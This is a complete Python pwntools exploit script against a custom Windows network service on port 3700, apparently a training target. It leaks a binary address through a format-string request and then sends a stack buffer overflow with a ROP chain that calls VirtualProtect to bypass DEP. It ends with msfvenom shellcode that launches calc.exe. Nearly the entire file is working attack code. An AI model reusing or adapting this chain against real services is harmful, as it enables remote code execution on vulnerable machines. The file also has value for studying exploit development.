#!/usr/bin/python3
from pwn import remote, p32

shell = remote("Windows", 3700)

shell.sendline(p32(902) + b"%p." * 10)
index = shell.recv()
shell.close()

shell = remote("Windows", 3700)
shell.sendline(p32(901) + index)

binary_leak = shell.recv().split(b".")[2].decode()
binary_base = int(binary_leak, 16) - 0x173b

shell.close()

# !py mona pattern_offset eip
offset = 2060
junk = b"A" * offset

"""
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,     (ESP)
  [in]  SIZE_T dwSize,        (0x1)
  [in]  DWORD  flNewProtect,  (0x40)
  [out] PDWORD lpflOldProtect (&Writable)
);
"""

rop  = b""
rop += p32(binary_base + 0x25c0)  # xor eax, eax; ret;
rop += p32(binary_base + 0x1e69)  # or eax, esp; ret;
rop += p32(binary_base + 0x2b38)  # pop ecx; ret;
rop += p32(0x64)                  # diff to args
rop += p32(binary_base + 0x9b36)  # add eax, ecx; pop ebx; ret;
rop += p32(0x41414141)            # padding for pop
rop += p32(binary_base + 0x1e73)  # mov ebx, eax; ret;
rop += p32(binary_base + 0x2b37)  # pop eax; pop ecx; ret;
rop += p32(binary_base + 0x4321c) # VirtualProtect()
rop += p32(0x41414141)            # padding for pop
rop += p32(binary_base + 0x1e6c)  # mov eax, dword ptr [eax]; add ecx, 5; pop edx; ret;
rop += p32(0x41414141)            # padding for pop
rop += p32(binary_base + 0x1e7a)  # mov dword ptr [ebx], eax; ret;
rop += p32(binary_base + 0x1e7d)  # xchg edx, ebx; cmp ebx, eax; ret;
rop += p32(binary_base + 0x2cec)  # mov eax, edx; ret;
rop += p32(binary_base + 0x2b38)  # pop ecx; ret;
rop += p32(0x18)                  # diff to call
rop += p32(binary_base + 0x9b36)  # add eax, ecx; pop ebx; ret;
rop += p32(0x41414141)            # padding for pop
rop += p32(binary_base + 0x1e7d)  # xchg edx, ebx; cmp ebx, eax; ret;
rop += p32(binary_base + 0x1e82)  # add ebx, 4; ret;
rop += p32(binary_base + 0x1e7a)  # mov dword ptr [ebx], eax; ret;
rop += p32(binary_base + 0x1e82)  # add ebx, 4; ret;
rop += p32(binary_base + 0x1e7a)  # mov dword ptr [ebx], eax; ret;
rop += p32(binary_base + 0x1e7d)  # xchg edx, ebx; cmp ebx, eax; ret;
rop += p32(binary_base + 0x2b38)  # pop ecx; ret;
rop += p32(0xfffffff8)            # 0x0 - 0x8
rop += p32(binary_base + 0x1e86)  # add edx, ecx; ret;
rop += p32(binary_base + 0x1e7d)  # xchg edx, ebx; cmp ebx, eax; ret;
rop += p32(binary_base + 0x1e76)  # xchg ebx, esp; dec ecx; ret;
rop += p32(0x1)                   # dwSize
rop += p32(0x40)                  # NewProtect
rop += p32(binary_base + 0xb041)  # Writable

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode
shellcode =  b""
shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
shellcode += b"\x63\x2e\x65\x78\x65\x00"

payload = junk + rop + shellcode

shell = remote("Windows", 3700)
shell.sendline(p32(800) + payload)
